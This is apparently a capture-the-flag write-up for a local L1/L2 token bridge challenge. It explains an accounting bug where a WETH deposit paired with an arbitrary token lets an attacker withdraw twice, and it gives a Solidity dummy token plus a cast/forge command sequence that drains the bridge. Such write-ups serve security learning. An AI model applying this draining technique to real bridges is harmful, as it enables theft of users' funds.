### HarryRiddle

#### Analysis

- The objective is to drain all the funds of the `L1` bridge. The balances of `L1` bridge is `2 ether` as in the setup.

- This project is the bridge between Layer1 and Layer2 to bridge the assets or message. There is an off-chain mechanism called `relayer` to catch the message in one layer and enforce the transaction in other layer.

#### Finding Bugs

- When deposit pair `(Layer1WETH, anyToken)` in `Layer1Bridge`, it will send the message to `Layer2Bridge` with `(Layer1WETH, Layer2WETH)` pair but the `deposits` map store the amount for `(Layer1WETH, anyToken)` pair.
- Illustration when we execute `depositERC20(WETH, anyToken, 1 ether)`
  - On the `L1` side, the `deposits[WETH][anyToken] += 1 ether`
  - However, on the `L2` side, `1 ether` of `WETH` tokens will be minted instead of `1 ether` of `anyToken`.
  - We will `withdraw` `WETH` from `L2` and receive `WETH` on `L1` chain. The important thing is that the map value of `(WETH, anyToken)` is not reduced but `(Layer1WETH, Layer2WETH)` occurs.

=> So we can exploit this bug to drain all funds.

- POC:

```javascript
    function _initiateERC20Deposit(
        address _l1Token,
        address _l2Token,
        address _from,
        address _to,
        uint256 _amount
    ) internal {
        IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

        bytes memory message;
        if (_l1Token == weth) {
            message = abi.encodeWithSelector(
                IL2ERC20Bridge.finalizeDeposit.selector,
                address(0),
@>              Lib_PredeployAddresses.L2_WETH,
                _from,
                _to,
                _amount
            );
        } else {
            message = abi.encodeWithSelector(
                IL2ERC20Bridge.finalizeDeposit.selector,
                _l1Token,
                _l2Token,
                _from,
                _to,
                _amount
            );
        }

        sendCrossDomainMessage(l2TokenBridge, message);
        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

        emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
    }
```

#### Exploitation

- Ensuring the Docker is on and we run the `deploy.sh` file with `./deploy.sh all` command.

- Running `nc localhost 1337` command to open the choice table in console screen. (Select `1`)

```sh
    nc localhost 1337

    1 - launch new instance
    2 - kill instance
    3 - get flag
    action?
```

- Get the player's address:

```sh
    cast wallet address --private-key <PRIVATE_KEY>
```

- Get addresses of the WETH and Bridge in Layer1 chain.

```sh
    cast call <CHALLENGE_CONTRACT_ADDRESS> "WETH()" --rpc-url <L1_RPC_URL> --private-key <PRIVATE_KEY>
    cast call <CHALLENGE_CONTRACT_ADDRESS> "BRIDGE()" --rpc-url <L1_RPC_URL> --private-key <PRIVATE_KEY>
```

- Deploy the `RandomToken` contract in Layer2 chain.

```javascript
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RandomToken {
    address public l1Token;
    constructor(address _l1Token) {
        l1Token = _l1Token;
    }

    function mint(address to, uint256 amount) external {}

    function burn(address to, uint256 amount) external {}
}

```

```sh
    forge create ./src/RandomToken.sol:RandomToken --rpc-url <L2_RPC_URL> --private-key <PRIVATE_KEY> --constructor-args <L1_WETH>
```

- Deposit `Ether` to `WETH` contract with `2 ether` value.

```sh
    cast send <L1_WETH> "deposit()" --rpc-url <L1_RPC_URL> --private-key <PRIVATE_KEY> --value 2ether
```

- Approve `WETH` for `L1_BRIDGE`

```sh
    cast send <L1_WETH> "approve(address,uint256)" --rpc-url <L1_RPC_URL> --private-key <PRIVATE_KEY> -- <L1_BRIDGE> 2000000000000000000
```

- Deposit `RandomToken` to `L1_BRIDGE1`

```sh
    cast send <L1_BRIDGE> "depositERC20(address,address,uint256)" --rpc-url <L1_RPC_URL> --private-key <PRIVATE_KEY> -- <L1_WETH> <RANDOM_TOKEN> 2000000000000000000
```

- To ensure we deposited (`WETH`, `RANDOM_TOKEN`, 2ether) in `L1` and received `WETH` in `L2`. We will enter this command

```sh
    cast call <L2_WETH> "balanceOf(address)" --rpc-url <L2_RPC_URL> --private-key <PRIVATE_KEY> -- <PLAYER>
```

- We will withdraw all tokens in `L1_BRIDGE` by 2 transactions, one is `L2_WETH` withdraw and last is `RANDOM_TOKEN` withdraw.

```sh
    cast send <L2_BRIDGE> "withdraw(address,uint256)" --rpc-url <L2_RPC_URL> --private-key <PRIVATE_KEY> -- <L2_WETH> 2000000000000000000

    cast send <L2_BRIDGE> "withdraw(address,uint256)" --rpc-url <L2_RPC_URL> --private-key <PRIVATE_KEY> -- <RANDOM_TOKEN> 2000000000000000000
```

- Run this command again and press `3` to check the finished.

```sh
    nc localhost 1337

    1 - launch new instance
    2 - kill instance
    3 - get flag
    action?
```
